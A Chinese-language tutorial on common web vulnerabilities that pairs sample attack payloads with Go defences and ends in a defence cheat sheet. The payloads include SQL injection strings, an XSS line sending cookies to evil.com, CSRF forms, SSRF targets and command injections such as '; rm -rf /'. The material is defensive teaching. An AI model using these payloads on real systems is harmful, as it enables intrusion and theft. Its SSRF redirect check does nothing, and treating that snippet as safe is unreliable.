# 常见 Web 漏洞

---

## 一、SQL 注入

### 1.1 攻击类型

```sql
-- 联合查询注入
' UNION SELECT username, password FROM users --

-- 盲注 - 布尔型
' AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 10 --

-- 盲注 - 时间型
' AND IF(1=1, SLEEP(3), 0) --

-- 堆叠查询
'; DROP TABLE users; --

-- 二次注入
-- 注册用户名: admin'--
-- 修改密码时触发: UPDATE users SET password='new' WHERE username='admin'--'
```

### 1.2 防御

```go
// ❌ 字符串拼接
query := fmt.Sprintf("SELECT * FROM users WHERE name = '%s'", name)

// ✅ 参数化查询
db.Query("SELECT * FROM users WHERE name = ?", name)

// ✅ ORM
db.Where("name = ?", name).First(&user)

// ✅ 输入验证
var safeName = regexp.MustCompile(`^[a-zA-Z0-9_]+$`).MatchString(name)
```

## 二、XSS (跨站脚本)

### 2.1 攻击类型

```html
<!-- 反射型 XSS：URL 参数直接输出 -->
https://example.com/search?q=<script>alert(document.cookie)</script>

<!-- 存储型 XSS：恶意脚本存入数据库 -->
<textarea onfocus="fetch('http://evil.com?c='+document.cookie)" autofocus>

<!-- DOM 型 XSS：前端 JS 不安全操作 -->
<div id="output"></div>
<script>
document.getElementById('output').innerHTML = new URLSearchParams(location.search).get('q');
</script>
```

### 2.2 防御

```go
// 输出编码
import "html"
safeOutput := html.EscapeString(userInput)

// CSP 头
c.Header("Content-Security-Policy", "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'")

// HttpOnly Cookie
c.SetCookie("token", token, 3600, "/", "", true, true)
//                                                    ↑ HttpOnly

// X-XSS-Protection
c.Header("X-XSS-Protection", "1; mode=block")
```

## 三、CSRF (跨站请求伪造)

### 3.1 攻击方式

```html
<!-- GET 请求伪造 -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">

<!-- POST 表单伪造 -->
<form action="https://bank.com/transfer" method="POST" id="csrf-form">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf-form').submit();</script>

<!-- AJAX 伪造 -->
<script>
fetch('https://bank.com/transfer', {
    method: 'POST',
    credentials: 'include',
    body: JSON.stringify({to: 'attacker', amount: 10000}),
});
</script>
```

### 3.2 防御

```go
// CSRF Token
func GenerateCSRFToken() string {
    b := make([]byte, 32)
    rand.Read(b)
    return base64.URLEncoding.EncodeToString(b)
}

// Double Submit Cookie
func CSRFMiddleware(c *gin.Context) {
    cookieToken, err := c.Cookie("csrf_token")
    headerToken := c.GetHeader("X-CSRF-Token")
    if err != nil || cookieToken == "" || cookieToken != headerToken {
        c.AbortWithStatusJSON(403, gin.H{"error": "CSRF token mismatch"})
        return
    }
    c.Next()
}

// SameSite Cookie
c.SetSameSite(http.SameSiteStrictMode)

// 检查 Origin/Referer
origin := c.Request.Header.Get("Origin")
if origin != "" && !isAllowedOrigin(origin) {
    c.AbortWithStatus(403)
}
```

## 四、SSRF (服务器端请求伪造)

### 4.1 攻击方式

```
# 访问内网服务
http://localhost:6379/         # Redis
http://169.254.169.254/        # AWS 元数据
http://10.0.0.1:8080/          # 内网服务

# 协议绕过
gopher://internal:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a  # Redis 命令

# DNS 重绑定
http://a.b.c.evil.com/ → 先解析为外部 IP，再解析为 127.0.0.1
```

### 4.2 防御

```go
func SafeFetch(urlStr string) (*http.Response, error) {
    u, err := url.Parse(urlStr)
    if err != nil {
        return nil, err
    }

    // 白名单协议
    if u.Scheme != "http" && u.Scheme != "https" {
        return nil, fmt.Errorf("protocol not allowed")
    }

    // 解析 IP
    ips, err := net.LookupIP(u.Hostname())
    if err != nil {
        return nil, err
    }

    for _, ip := range ips {
        if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() || ip.IsLinkLocalMulticast() {
            return nil, fmt.Errorf("internal address not allowed")
        }
        if ip.IsUnspecified() {
            return nil, fmt.Errorf("unspecified address not allowed")
        }
    }

    // 域名白名单
    allowed := []string{"api.example.com", "cdn.example.com"}
    if !contains(allowed, u.Hostname()) {
        return nil, fmt.Errorf("domain not allowed")
    }

    client := &http.Client{
        Timeout: 10 * time.Second,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            // 检查重定向目标
            return nil
        },
    }
    return client.Get(urlStr)
}
```

## 五、文件上传漏洞

### 5.1 攻击方式

```
1. 上传 Web Shell: shell.php / shell.jsp
2. 双扩展名绕过: shell.php.jpg
3. MIME 类型伪造: 修改 Content-Type
4. 大小写绕过: shell.PhP
5. 空字节绕过: shell.php%00.jpg
6. .htaccess 上传: 覆盖服务器配置
```

### 5.2 防御

```go
func UploadHandler(c *gin.Context) {
    file, header, err := c.Request.FormFile("file")
    if err != nil {
        c.JSON(400, gin.H{"error": "no file"})
        return
    }
    defer file.Close()

    // 1. 文件大小限制 (5MB)
    if header.Size > 5<<20 {
        c.JSON(400, gin.H{"error": "file too large"})
        return
    }

    // 2. 读取前 512 字节检测真实类型
    buf := make([]byte, 512)
    n, _ := file.Read(buf)
    contentType := http.DetectContentType(buf[:n])
    allowedTypes := map[string]bool{
        "image/jpeg": true,
        "image/png":  true,
        "image/gif":  true,
    }
    if !allowedTypes[contentType] {
        c.JSON(400, gin.H{"error": "file type not allowed"})
        return
    }

    // 3. 生成随机文件名
    ext := path.Ext(header.Filename)
    newFilename := uuid.New().String() + ext

    // 4. 存储到安全目录（不可通过 URL 直接访问）
    dst := path.Join("/data/uploads", newFilename)
    c.SaveUploadedFile(header, dst)

    c.JSON(200, gin.H{"filename": newFilename})
}
```

## 六、命令注入

### 6.1 攻击方式

```bash
# 用户输入: 127.0.0.1; cat /etc/passwd
ping -c 1 127.0.0.1; cat /etc/passwd

# 用户输入: test; rm -rf /
ping -c 1 test; rm -rf /

# 反引号注入
ping -c 1 `cat /etc/passwd`
```

### 6.2 防御

```go
// ❌ 使用 exec.Command 拼接
cmd := exec.Command("sh", "-c", "ping -c 1 "+userInput)

// ✅ 使用参数数组
cmd := exec.Command("ping", "-c", "1", userInput)

// ✅ 输入验证
var validIP = regexp.MustCompile(`^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$`)
if !validIP.MatchString(userInput) {
    return fmt.Errorf("invalid IP address")
}
```

## 七、漏洞防御速查表

| 漏洞 | 核心防御 | 辅助防御 |
|------|----------|----------|
| SQL 注入 | 参数化查询 | ORM、输入验证 |
| XSS | 输出编码 | CSP、HttpOnly |
| CSRF | CSRF Token | SameSite Cookie |
| SSRF | IP/域名白名单 | 禁止内网访问 |
| 文件上传 | 类型检测+随机名 | 大小限制、隔离存储 |
| 命令注入 | 参数数组 | 输入白名单 |
| 越权 | 权限校验 | RBAC、资源所有权 |
